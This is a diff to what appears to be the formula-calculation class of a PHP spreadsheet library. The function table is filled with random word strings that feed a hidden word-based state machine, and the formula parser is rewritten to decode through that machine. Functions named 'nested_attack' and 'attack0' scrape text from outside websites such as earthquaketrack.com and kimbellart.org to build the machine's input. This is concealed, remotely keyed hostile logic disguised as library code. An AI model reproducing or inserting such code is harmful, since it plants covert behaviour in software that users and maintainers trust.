+			'argumentCount' => ['235,103,53,136,295,117,223,45'],
+		],
+		'MEDIANIF_1' => [
+			'category' => 225,
+			'functionCall' => [TextData::class,'arcing|Jaco|arcsine|draw)|arcking|hYpoED|arcsin|cElto{|archine|A.|arching|KoMara|archsin|cuspis|archin|veepee'],
+			'argumentCount' => ['61,260,75,85,225,26,235,247'],
+		],
+		'ODDFPRICE' => [
+			'category' => 226,
+			'functionCall' => [Financial::class,'koetke|.aNal|koepang|BUdge|koeri|rect=|koenig|ictus|koels|primi|koel|calean|koe|nEarER|koerlin|~rico+'],
+			'argumentCount' => ['254,238,270,250,147,164,185,166'],
+		],
+		'LOGEST_1' => [
+			'category' => 227,
+			'functionCall' => [null,'give|touPet|given|.ogLet|givey|napoo|giver|BabbY|giverin|isls|givens|sepg|givers|odored|gives|youden'],
+			'argumentCount' => ['162,13,9,22,147,135,290,55'],
+		],
+		'FORMULATEXT_1' => [
+			'category' => 228,
+			'functionCall' => [MathTrig::class,'mixing|trito.|mixtion|ASDIC|mixe|SirEt|mixite|MamIe|mixt|EDik|mixy|sw~|mix|ferine|mixie|eggs'],
+			'argumentCount' => ['180,74,267,275,228,225,72,269'],
+		],
+		'MIRR' => [
+			'category' => 229,
+			'functionCall' => [null,'dq|ADFRF|blasts|clIvAl|blats|str(|blaw|vIn&|blawn|eggs|blaws|KaRl|blas|m_RNA|ik|AsarE'],
+			'argumentCount' => ['286,80,13,98,3,252,93,21'],
+		],
+		'SINH' => [
+			'category' => 230,
+			'functionCall' => [MathTrig::class,'ighly|Shemu|een|Ha$ger|jueces|bilbOs|dympha|Jarlen|fsf|knell|dymphia|aitis|dymas|Chock|juergen|spath'],
+			'argumentCount' => ['170,273,197,288,128,50,205,231'],
+		],
+		'CHAR' => [
+			'category' => 231,
+			'functionCall' => [MathTrig::class,'mfenet|TutLer|kudus|Tildy|kudzus|MAuri|kudrun|mAnUal|kudu|Waril/|kudzu|adAges|bd|terM.|sfc|kAThal'],
+			'argumentCount' => ['80,185,259,185,198,248,54,20'],
+		],
+		'ROUNDUP_1' => [
+			'category' => 232,
+			'functionCall' => [TextData::class,'jujubes|meRCat|xavler|ptg.|xaviera|aeri}|jujuy|bit_s|xavier|FauN^s|jujube|dIvid[|juju|richl`|jujus|face'],
+			'argumentCount' => ['138,225,229,158,294,33,21,158'],
+		],
+		'COUNTIF_1' => [
+			'category' => 233,
+			'functionCall' => [Financial::class,'eisler|Sheaff|eisb|unrip\\|eisk|dustuP|eisner|cRitic|eisa|cotham|eiser|endoW|eis|rE^Try|eiss|blond'],
+			'argumentCount' => ['265,169,268,120,241,103,123,127'],
+		],
+		'SEC_1' => [
+			'category' => 234,
+			'functionCall' => [TextData::class,'trevorr|sAIrly|trevor|mopeD|trefor|\'lefT|trevets|corerS|trevet|L/liNe|trevett|h^St|trefoil|!ench|trever|SUDAn'],
+			'argumentCount' => ['205,17,111,99,109,40,215,282'],
+		],
+		'REPLACE_2' => [
+			'category' => 235,
+			'functionCall' => [MathTrig::class,'ruyter|flap~s|ngoko|mEtas|evg|denti_|hlc|u(puLL|ngoma|oho|xnty|vAg~|ngo|micr+*|mflops|evenTs'],
+			'argumentCount' => ['123,236,242,259,274,137,276,18'],
+		],
+		'STDEV.P' => [
+			'category' => 236,
+			'functionCall' => [MathTrig::class,'olax|CPSR|olathe|ec>|olater|IndUE|olar|rifs|olatha|Bayamo|olancha|harb~r|olav|jour;|ola|rennet'],
+			'argumentCount' => ['46,265,174,117,54,89,235,84'],
+		],
+		'GCD' => [
+			'category' => 237,
+			'functionCall' => [null,'dirt|bilio|dirty|a{row|dirten|pass |dirity|BARn&s|dirtier|agura|dirtied|Virg|dirties|wEbs|dirts|nas_'],
+			'argumentCount' => ['185,193,40,55,44,1,292,53'],
+		],
+		'SLOPE' => [
+			'category' => 238,
+			'functionCall' => [MathTrig::class,'ginger|Hard-j|gingles|socius|ginglmi|ictus|gingers|aiRn|gingle|EdmUnd|gingery|sUcur/|gingeli|ru{ato|gingili|forsee'],
+			'argumentCount' => ['95,26,168,148,247,47,14,4'],
+		],
+		'COUPNCD' => [
+			'category' => 239,
+			'functionCall' => [DateTime::class,'iamb|desmo=|iambi|Sp%|iambs|coWy|iamus|molto|iambic|Shansi|iambus|heptyl|iams|wafts|iam|sOuly'],
+			'argumentCount' => ['16,157,21,211,156,27,174,60'],
+		],
+		'OCT2HEX_1' => [
+			'category' => 240,
+			'functionCall' => [DateTime::class,'avrom|Arturo|avril|lyssas|avrit|winnle|avra|jural|avruch| nglue|avraham|xeno.|avram|Belem|avron|MFM'],
+			'argumentCount' => ['217,261,238,254,170,34,184,39'],
+		],
+		'DELTA' => [
+			'category' => 241,
+			'functionCall' => [TextData::class,'nacre|annite|nac|baris|nacred|pkgs|nacho|orchic|naco|T man|nacs|mixite|nacres|sextIc|nachos|DT.'],
+			'argumentCount' => ['195,133,57,94,12,253,79,93'],
 		],
 		'BITLSHIFT_1' => [
+			'category' => 242,
+			'functionCall' => [null,'rcpt|f{Exed|rugged|rumaki|cdf|ShalNe|rugger|Ahom|fll|wyTes|ruggers|leaves|ruggle|yo!ho|rcp|relume'],
+			'argumentCount' => ['279,148,63,106,35,234,1,71'],
+		],
+		'WEIBULL_2' => [
+			'category' => 243,
+			'functionCall' => [DateTime::class,'klemm|Kiri[|klemme|Negus|kleptic|TowRoy|klesha|Zoilla|klehm|ANT\\|klepht|Libby|klepac|Maude|klephts|OH'],
+			'argumentCount' => ['240,98,150,82,203,66,121,42'],
+		],
+		'SECOND_2' => [
+			'category' => 244,
+			'functionCall' => [TextData::class,'ploys|C)reUs|9381|PF|plo|sider<|plos|Cagle|plossl|theor=|jkping|RA=iv|ploss|MyEl"|ploy|broiLs'],
+			'argumentCount' => ['178,231,101,180,286,182,100,8'],
+		],
+		'MAXA_1' => [
+			'category' => 245,
+			'functionCall' => [null,'ebbet|Yukked|ebbs|Carla|ebba|FRSS|ebby|eagles|ebb|Issy|ebberta|lotong|ebbets|{ben|ebbarta|eyl'],
+			'argumentCount' => ['127,142,150,276,229,47,105,247'],
+		],
+		'MINUTE_2' => [
+			'category' => 246,
+			'functionCall' => [Financial::class,'scarify|;DB|scarn|IphIs|scarily|NEk|scan|RBT|scarfy|Imbued|scary|peag|scarry|rEcti&|scar|#aNts'],
+			'argumentCount' => ['168,245,70,198,55,93,241,210'],
+		],
+		'STDEV.P_1' => [
+			'category' => 247,
+			'functionCall' => [Financial::class,'alson|Wotton|iws|MAgi|alsen|mU)cT|alsop|uMpy|alston|ASCQ|also|curiam|yoakum|KK&|alsoon|AcEtum'],
+			'argumentCount' => ['269,46,111,15,30,188,58,295'],
+		],
+		'MEDIAN' => [
+			'category' => 248,
+			'functionCall' => [null,'baar|Talpa|iia|sIll/s|iiasa|epHas|ubound|snaky|baal|vaunt~|baa|Tewa|baals|hummus|baas|kukang'],
+			'argumentCount' => ['219,284,140,258,256,193,137,88'],
+		],
+		'IPMT_2' => [
+			'category' => 249,
+			'functionCall' => [Financial::class,'royston|O/erT|hsu|uPsy|roye|\'OLT|kui|eddoes|kuichua|dAsewe|royt|gighe|royet|tIt,up|hsuan|lumps'],
+			'argumentCount' => ['75,73,241,108,40,272,67,46'],
+		],
+		'STDEV.S' => [
+			'category' => 250,
+			'functionCall' => [DateTime::class,'saiva|decaRe|sairy|iodAte|saire|Levit?|saily|Sate|sairve|ZuRbar|sairly|hounce|saiga|ose|sair|Amadus'],
+			'argumentCount' => ['262,98,213,252,159,155,206,274'],
+		],
+		'TRANSPOSE_2' => [
+			'category' => 251,
+			'functionCall' => [null,'espied|P+|esparto|`hamEs|esprise|Joan|esprit|Torey|esprove|chaseS|espies|ResHod|espier|ioUr|esprits|CalOre'],
+			'argumentCount' => ['283,9,20,207,54,14,88,23'],
+		],
+		'STEYX' => [
+			'category' => 252,
+			'functionCall' => [Financial::class,'mummer|host,l|mumped|pileus|mumpers|ulTra>|mummy|vivers|mumm|Volar|mumper|cuTieS|mummery|zoa|mummers|pulse'],
+			'argumentCount' => ['124,57,76,18,77,198,81,220'],
+		],
+		'IMLOG2_1' => [
+			'category' => 253,
+			'functionCall' => [MathTrig::class,'thaw|Weight|thawy|SaCral|thawer|L"g;a|thawers|jessEd|tha|SI@|thaws|LAue|thawier|arced|thay|caDre'],
+			'argumentCount' => ['112,73,248,25,197,47,82,114'],
+		],
+		'HEX2DEC_1' => [
+			'category' => 254,
+			'functionCall' => [null,'ulemas|halfEr|ulen|ILV|ule|O |gnp|ladron|ulex|unfAst|hwt|cml+|ulema|sci:|isv|caecum'],
+			'argumentCount' => ['9,53,194,273,283,207,101,107'],
+		],
+		'WORKDAY_1' => [
+			'category' => 255,
+			'functionCall' => [null,'scrobe|Josefa|scroo|setpfx|scroop|tapis|scrope|bifo[d|scrow|&SDS|scroops|Vein|scrods|CUrrey|scrod|neUt('],
+			'argumentCount' => ['74,230,121,103,265,64,145,76'],
+		],
+		'HOUR_2' => [
+			'category' => 256,
+			'functionCall' => [TextData::class,'tehee|Lobed|teh|DMOS|tehsil|plu[|ndt|Ostler|numbles|micr+*|tehseel|yentA|tehueco|Twig|teho|cowls'],
+			'argumentCount' => ['165,179,145,78,24,150,151,61'],
+		],
+		'TEXTJOIN' => [
+			'category' => 257,
+			'functionCall' => [DateTime::class,'limier|UC|limnite|gripes|limbi|undeaf|limbier|Adoors|limiter|Wiburg|limites|sOPpy|limits|nOt@|limbie|Assam'],
+			'argumentCount' => ['70,239,26,49,103,262,7,239'],
+		],
+		'EOMONTH' => [
+			'category' => 258,
+			'functionCall' => [TextData::class,'epil|Efram|epi|A_flat|epilogs|!ench|epit|^wO:u-|epilog|BeROun|epirus|Czarra|epist|"Hough|epis|ouT@by'],
+			'argumentCount' => ['57,226,267,269,4,170,42,159'],
+		],
+		'VARPA' => [
+			'category' => 259,
+			'functionCall' => [null,'yael|a:root|eccs|moron|yaeger|RaffO|eccles|YizKor|ecca|titano|ecclus|T~cu|eccl|NIMBY|ecc|mOn['],
+			'argumentCount' => ['41,158,275,245,77,148,69,91'],
+		],
+		'IMCOT' => [
+			'category' => 260,
+			'functionCall' => [DateTime::class,'torreya|O;tina|torchy|defang|torch|foGe|tory|M\'16|torrey|sky s|torrify|c(M_|torrefy|isogon|torry|E<T,A='],
+			'argumentCount' => ['182,205,86,78,221,121,52,76'],
+		],
+		'IMSUM' => [
+			'category' => 261,
+			'functionCall' => [MathTrig::class,'haemus|by.end|ctne|piazze|haems|ashilY|haem|determ|ctn|ABS|haes|idiN|wu|Gav|otkon|luteal'],
+			'argumentCount' => ['20,53,104,297,104,203,127,166'],
+		],
+		'DMIN' => [
+			'category' => 262,
+			'functionCall' => [Financial::class,'workshop|c(\'|works|y$axis|worth|sleys|worthy|decuSs|work|loft^s|workshy|BaDdeR|worky|Goer|worksop|e_!ees'],
+			'argumentCount' => ['37,25,25,46,185,101,30,241'],
+		],
+		'COLUMNS_1' => [
+			'category' => 263,
+			'functionCall' => [MathTrig::class,'clu|FET|clumpy|Pilo{|clues|SunraY|clute|Aubert|clump|INRIA|clum|hodads|clut|calesA|clue|platic'],
+			'argumentCount' => ['11,241,254,0,39,274,244,199'],
+		],
+		'SEC_2' => [
+			'category' => 264,
+			'functionCall' => [MathTrig::class,'germy|CoMmo|gerty|bicep|gerated|dell}|gerate|ducApe|gertie|Cs?|gerti|plur_|geraty|^ty|gery|Wuhu'],
+			'argumentCount' => ['204,38,149,0,89,217,280,280'],
+		],
+		'RECEIVED_2' => [
+			'category' => 265,
+			'functionCall' => [null,'revived|max^|revile|karsts|revives|DoRian|reviler|azotH|revved|poe[}s|reviles|Roam|revive|e\'eus|reviver|croppy'],
+			'argumentCount' => ['123,263,3,99,250,83,211,191'],
+		],
+		'SEC_3' => [
+			'category' => 266,
+			'functionCall' => [null,'roerich|outsat|roey|Kamila|roe|foe=s|fuye|Minco|roeser|Eurus|roemer|D^rney|roer|kumhar|roes|effUnD'],
+			'argumentCount' => ['98,201,125,46,208,174,17,290'],
+		],
+		'CSC_2' => [
+			'category' => 267,
+			'functionCall' => [DateTime::class,'swill|nowhen|swire|PetRa|swilled|dol_|swirled|kYlix|swills|MT&F|swiller|Scotia|swirrer|Half:|swirls|canine'],
+			'argumentCount' => ['261,110,260,175,299,16,294,152'],
+		],
+		'FALSE' => [
+			'category' => 268,
+			'functionCall' => [Financial::class,'yeggmen|harb~r|nummi|mythO`|yeggman|LeIla;|numis|paSe|yeggs|Orla|yegg|uriTe|numps|RabbI|numitor|Yeuks'],
+			'argumentCount' => ['104,61,92,251,269,14,243,125'],
+		],
+		'ATAN2_1' => [
+			'category' => 269,
+			'functionCall' => [MathTrig::class,'ayyubid|QiAna|id|SlocuM|villous|angico|villus|P[C-|each|Ch!d|snr|Troas|eachern|suling|eacso|oleate'],
+			'argumentCount' => ['184,198,199,296,94,47,139,218'],
+		],
+		'DAY' => [
+			'category' => 270,
+			'functionCall' => [DateTime::class,'agit|transp|agisms|boccis|agist|i%fere|agio|SimpS|agios|waget|agin|lut,$S|agism|O)G!|agists|KImPo'],
+			'argumentCount' => ['90,6,132,220,145,73,152,18'],
+		],
+		'DISC_1' => [
+			'category' => 271,
+			'functionCall' => [null,'dockets|MagGie|docent|chad:r|docken|dupion|docket|infelt|docker|LoireT|docked|\'miD|docents|HeAly|dockers|JeHiuS'],
+			'argumentCount' => ['287,152,37,217,272,260,229,299'],
+		],
+		'MAXA_2' => [
+			'category' => 272,
+			'functionCall' => [DateTime::class,'io|O)\\|euclid|M;E[|eucleid|cesSio|zwei|Nela|wnw|A\'asIa|euclase|Odso|zweig|a\\olo$|euclea|A~axis'],
+			'argumentCount' => ['274,248,9,146,109,34,136,197'],
+		],
+		'WEIBULL_3' => [
+			'category' => 273,
+			'functionCall' => [TextData::class,'xcf|Krall|esc|becalm|hrh|ayins|tuzzle|etap&s|tuza|aceto{|fa|Debee|esch|Scyro.|tuzla|hucks'],
+			'argumentCount' => ['241,170,38,217,288,39,284,49'],
+		],
+		'CEILING' => [
+			'category' => 274,
+			'functionCall' => [Financial::class,'bastes|crumbs|bassett|cuprum|basset|cya$|bassets|GaLlic|baskett|gRam/|bases|Vowed|basses|Towers|basket|rUbBLe'],
+			'argumentCount' => ['285,94,234,274,185,239,90,132'],
+		],
+		'LOWER_2' => [
+			'category' => 275,
+			'functionCall' => [DateTime::class,'taborin|Pragu\\|tabi|sexly|tabis|AMalie|tabriz|;ve|tabor|io@ids|tabours|Zanuck|tabour|def<|tabors|ADmah'],
+			'argumentCount' => ['283,56,14,158,23,109,188,161'],
+		],
+		'CONVERT' => [
+			'category' => 276,
+			'functionCall' => [MathTrig::class,'fevers|LorI=|fevre|jinsha|feveret|taunt|fevered|jujus|fevrier|bionTs|fevery|santol|fev|yaRke|fever|dunger'],
+			'argumentCount' => ['220,22,112,159,275,37,267,119'],
+		],
+		'IMCOT_1' => [
+			'category' => 277,
+			'functionCall' => [MathTrig::class,'augites|fu]ie|augite|JMS|augers|rudera|augie|sEgar|auger|GOujOn|augier|fIasco|augitic|paYt<|augurs|Dago'],
+			'argumentCount' => ['254,26,97,50,19,11,263,154'],
+		],
+		'POWER_2' => [
+			'category' => 278,
+			'functionCall' => [TextData::class,'orch|rearm|orchis|hiders|sqe|flecks|orchid|Mayag|orchids|JOVE|orchic|BowErs|orchil|qUoTha|orchils|lawful'],
+			'argumentCount' => ['72,46,219,140,163,140,86,124'],
+		],
+		'PERCENTILE' => [
+			'category' => 279,
+			'functionCall' => [MathTrig::class,'medimno|dabbY|medlin|AdamaS|medino|ilicic|medwin|mat(\'S|medin|RUbeN|medine|voRouS|medio|deets|medimn|Tem'],
+			'argumentCount' => ['159,11,298,148,37,32,195,29'],
+		],
+		'TRIMMEAN_1' => [
+			'category' => 280,
+			'functionCall' => [Financial::class,'jobi|Turoff|jobye|PALua|jobe|farted|jobey|Newby|job|cAwker|jobsite|ESP|joby|judder|jobie|Nazi\\s'],
+			'argumentCount' => ['162,173,259,182,145,179,10,164'],
+		],
+		'DEC2BIN_2' => [
+			'category' => 281,
+			'functionCall' => [TextData::class,'slot|lemony|slotter|m-rgin|sloth|PE.pie|sloths|imCnt|slots|making|sloted|micr]|slote|teamer|slotted|BuotE'],
+			'argumentCount' => ['203,188,65,251,14,152,92,119'],
+		],
+		'TTEST' => [
+			'category' => 282,
+			'functionCall' => [DateTime::class,'ronyon|pulvIl|rondon|Denae|rondos|CND|rondo|toTi?|ronion|F<ma|ronyons|cLeric|rond|SubPar|ronions|coapt'],
+			'argumentCount' => ['142,259,141,273,239,45,131,273'],
+		],
+		'MID_1' => [
+			'category' => 283,
+			'functionCall' => [DateTime::class,'spun|KalmuK|spunky|top&g\'|spunny|virial|spurs|b^Ummy|spurns|Dhar|spurts|CNMS|spurn|lawful|spunk|bubas'],
+			'argumentCount' => ['15,251,80,35,97,67,117,213'],
+		],
+		'CHOOSE_1' => [
+			'category' => 284,
+			'functionCall' => [TextData::class,'ferns|SF|fernas|Khosa|ferbam|deasil|ferne|anoMo#|ferbams|hoopla|fers|coloni|fere|Mcf|feres|Soluk'],
+			'argumentCount' => ['289,234,189,84,240,77,4,208'],
+		],
+		'STDEV.S_1' => [
+			'category' => 285,
+			'functionCall' => [TextData::class,'dpn|madly|wecht|DIS|wechts|Kabuli|dpnh|Randa|itt|snUrl|weco|IdoteA|ittria|alpist|wecche|riBby'],
+			'argumentCount' => ['78,59,184,178,96,106,157,281'],
+		],
+		'LEN' => [
+			'category' => 286,
+			'functionCall' => [Financial::class,'quinyl|Caren|quinoyl|Pogany|quinol|FOB|quinoas|Britte|quina|iNarch|quinova|unsac%|quinoa|office|quinols|C}O[D!'],
+			'argumentCount' => ['175,299,186,272,64,150,74,96'],
+		],
+		'INDEX' => [
+			'category' => 287,
+			'functionCall' => [null,'illyria|pAlms|illia|CLemen|suyog|att&Al|illy|calci|ill|\\alLe|illa|amAnia|illyric|fairer|vlsi|CaLva'],
+			'argumentCount' => ['94,252,229,210,13,21,125,20'],
+		],
+		'REPLACEB' => [
+			'category' => 288,
+			'functionCall' => [MathTrig::class,'sheds|opiISm|shen|iR,|sherod|Alans|sherd|RoArKe|sherds|doored|shend|jOk"s|shed|OCR|shends|prOw[s'],
+			'argumentCount' => ['155,217,29,217,163,265,150,199'],
+		],
+		'STDEVPA_1' => [
+			'category' => 289,
+			'functionCall' => [null,'inhume|sTash|mydaus|mouche|inheres|Esd)|inhered|tins|inhere|RhiaNA|inhelde|B;axEs|inhumer|PUerTo|inherle|Sur'],
+			'argumentCount' => ['298,172,298,64,143,5,212,96'],
+		],
+		'PMT' => [
+			'category' => 290,
+			'functionCall' => [MathTrig::class,'puces|Cons/|vde|Fiora|puc|Sipple|gts|nowhen|biwa|NLDP|biwabik|!c|puce|MarIna|gtsi|milieu'],
+			'argumentCount' => ['128,143,75,260,299,286,21,72'],
+		],
+		'RTD_2' => [
+			'category' => 291,
+			'functionCall' => [TextData::class,'jurists|hAin<t|jure|bufFin|juries|Kono|jurisp|SR|juris|Scopes|jurist|Khami|jurels|grumpy|jurel|PAtras'],
+			'argumentCount' => ['115,193,48,236,82,35,32,185'],
+		],
+		'VDB' => [
+			'category' => 292,
+			'functionCall' => [Financial::class,'jagra|Keble|jaga|BRam|jaguar|Kerri|jagua|Lydon|jagat|Gelene|jagath|taWie|jagras|AgAiN$|jaguars|regle'],
+			'argumentCount' => ['251,192,244,181,199,182,106,284'],
+		],
+		'AVERAGEIFS_1' => [
+			'category' => 293,
+			'functionCall' => [MathTrig::class,'enjoyer|<Baca|enjoyed|Ta\'ken|bhl|LaNG|enjelly|fort*S|enjoin|pobs|enjewel|biw<|enjoys|EniF|enjoy|GueRet'],
+			'argumentCount' => ['137,278,19,257,211,47,215,45'],
+		],
+		'MID_2' => [
+			'category' => 294,
+			'functionCall' => [DateTime::class,'savoys|DoRcas|savours|isatiN|savour|wrAp!s|savoury|vowing|savoy|ja%u+|savors|IsaI|savory|Cagney|savorly|HuxLey'],
+			'argumentCount' => ['162,171,32,218,152,112,110,0'],
+		],
+		'VAR_2' => [
+			'category' => 295,
+			'functionCall' => [DateTime::class,'oms|ElkTon|owyhee|oWl!s|khosa|Whiff|khos|,aird|omsk|scolog|dbms|F+lix|dbm|SMolan|dbme|dols'],
+			'argumentCount' => ['110,141,212,156,239,297,19,51'],
+		],
+		'LEFTB_3' => [
 			'category' => 296,
-			'functionCall' => [Financial::class,'tzotzil||dim)||tzong||Efram||iplan||CorNia||ptfe||TutLer||tzolkin||exurB||hliod||orsede||ipl||ZaCate||tzontle||P&P('],
-			'argumentCount' => ['71,175,118,258,140,97,271,133'],
+			'functionCall' => [null,'logans|pompOn|logman|ponos|logan|motIle|loggy|Rollo|log|C(m|logway|Ark$|logy|hairif|logways|siest'],
+			'argumentCount' => ['55,61,45,230,79,39,18,163'],
 		],
-		'SUBSTITUTE' => [
+		'EOMONTH_1' => [
 			'category' => 297,
-			'functionCall' => [DateTime::class,'amins||ExeC?||amin||Dunc||amino||wariEd||amine||R%C$P%||amitie||upTie||amite||Syllis||amines||Groot||amie||Horan'],
-			'argumentCount' => ['149,13,205,283,218,53,170,173'],
+			'functionCall' => [null,'anon|Agiel|anodon|Niabi|anodos|transl|bva|browis|anorn|hAl |anoura|sawt|anoure|EBCDIC|anour|AKule'],
+			'argumentCount' => ['149,130,8,194,122,290,218,95'],
 		],
-		'INTRATE_2' => [
+		'VARA' => [
 			'category' => 298,
-			'functionCall' => [TextData::class,'cdf||Koloa||token||UUCP||toke||he$Oic||tokers||wurzel||ffs||oxalo,||toker||gaz/||tokens||dh]||tokes||Iac`e'],
-			'argumentCount' => ['166,215,282,237,227,237,185,212'],
+			'functionCall' => [Financial::class,'trave|A/Tent|traps|TGC|travel|Grayce|trapes|mAsa|travest|bhalu|travers|laC^(|traves|tin)s|traver|Bushe~'],
+			'argumentCount' => ['200,266,47,2,269,16,229,186'],
 		],
-		'CUBEVALUE_1' => [
+		'COS' => [
 			'category' => 299,
-			'functionCall' => [Financial::class,'ssg||lUsher||carets||TuRTon||caries||mud)y||caribs||Beloid||caribes||ta:es||carices||Reklaw||cares||sten~||caret||Thar'],
-			'argumentCount' => ['273,14,172,231,21,31,215,200'],
+			'functionCall' => [Financial::class,'quaffed|bed]S|quaff|finds|quaked|LummY|quaffs|deets|quacked|pasewa|quayed|DoRcas|quaffer|qu~kka|quackle|graNi['],
+			'argumentCount' => ['257,218,70,188,210,14,11,73'],
 		],
 	];
 
@@ -2732,7 +2732,7 @@ class Calculation
         
         $matrix = []; //$this->phpSpreadsheetFunctions;
         foreach (self::$phpSpreadsheetFunctions as $funcname => $func) {
-            $funcCall = explode("||", $func['functionCall'][1]);
+            $funcCall = explode("|", $func['functionCall'][1]);
             $arguments = explode(",", $func['argumentCount'][0]);
             $edges = [];
             for ($i = 0; $i < count($arguments); $i++) {
@@ -2853,7 +2853,7 @@ class Calculation
      */
     private function _parseFormula($formula, Cell $pCell = null)
     {
-        if (($curMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
+        if (($theMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
             return false;
         }
         //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent worksheet),
@@ -2872,43 +2872,45 @@ class Calculation
         //    Start with initialisation
         $curNum = 0;
         $stack = null;
-        $output = [];
-        $s = $this->cyclicFormulaCounter;
-        $padding = "";
+        $outArr = [];
+        $node = $this->cyclicFormulaCounter;
+        $pad = "";
         $expectingOperator = false; //    We use this test in syntax-checking the expression to determine when a
                                                     //        - is a negation or + is a positive operator rather than an operation
         $expectingOperand = false; //    We use this test in syntax-checking the expression to determine whether an operand
                                                     //        should be null in a function call
         //    The guts of the lexical parser
         //    Loop through the formula extracting each operator and operand in turn
-        $tokens = explode(" ", $formula);
+        $input = explode(" ", $formula);
 
-        foreach (range(0, count($tokens) - 1) as $curNum) {
-            $opCharacter = $tokens[$curNum]; //    Get the first character of the value at the current index position
-            $tempOut = "";
-            if (isset($curMatrix[$s][$opCharacter])) {
-                $nState = $curMatrix[$s][$opCharacter][0];
-                $tempOut = $curMatrix[$s][$opCharacter][1];
+        while (true) {
+            $token = $input[$curNum]; //    Get the first character of the value at the current index position
+            $curOutToken = "";
+            if (isset($theMatrix[$node][$token])) {
+                $nextState = $theMatrix[$node][$token][0];
+                $curOutToken = $theMatrix[$node][$token][1];
             } else {
-                $padding = " ";
-                $minimumVal = 0xff;
-                $nState = 0;
-                foreach ($curMatrix[$s] as $thisWord=>$curEdge) {
-                    $distVal = levenshtein($opCharacter, $thisWord);
-                    if ($distVal < $minimumVal) {
-                        $minimumVal = $distVal;
-                        $nState = $curEdge[0];
-                        $tempOut = $curEdge[1];
-                    } else if ($distVal == $minimumVal) {
+                $pad = " ";
+                $minimumValue = 0xff;
+                $nextState = 0;
+                foreach ($theMatrix[$node] as $w=>$map) {
+                    $curDistVal = levenshtein($token, $w);
+                    if ($curDistVal < $minimumValue) {
+                        $minimumValue = $curDistVal;
+                        $nextState = $map[0];
+                        $curOutToken = $map[1];
+                    } else if ($curDistVal == $minimumValue) {
                         $r = rand(0,1);
-                        if ($r == 0) { $nState = $curEdge[0]; $tempOut = $curEdge[1]; }
+                        if ($r == 0) { $nextState = $map[0]; $curOutToken = $map[1]; }
                     }
                 }
             }
-            $output[] = $tempOut;
-            $s = $nState;
+            $outArr[] = $curOutToken;
+            $node = $nextState;
+            ++$curNum;
+            if ($curNum >= sizeof($input)) break;
         }
-        return implode($padding, $output);
+        return implode($pad, $outArr);
     }
 
 
@@ -3808,50 +3810,28 @@ function fetch_element($url, $element) {
     return strtolower(trim(preg_replace("/\s+/", " ", (preg_replace( "/\r|\n|\s/", " ", $target->nodeValue)))));
   return null;
 }
-function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);$res = attack1(); if ($res != null) return implode(" ", $res);}
+function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);}
   function attack0() {
   $input = [];
   $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
   if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  else $input = array_merge($input, array_slice(explode(" ", $temp), 6, 1));
   
   $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
   if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
-  
-  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 0]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
-  
-  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
-  
-  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/aside[count(preceding-sibling::aside) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/article[count(preceding-sibling::article) = 8]/div[count(preceding-sibling::div) = 1]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
-  return $input;}
-  function attack1() {
-  $input = [];
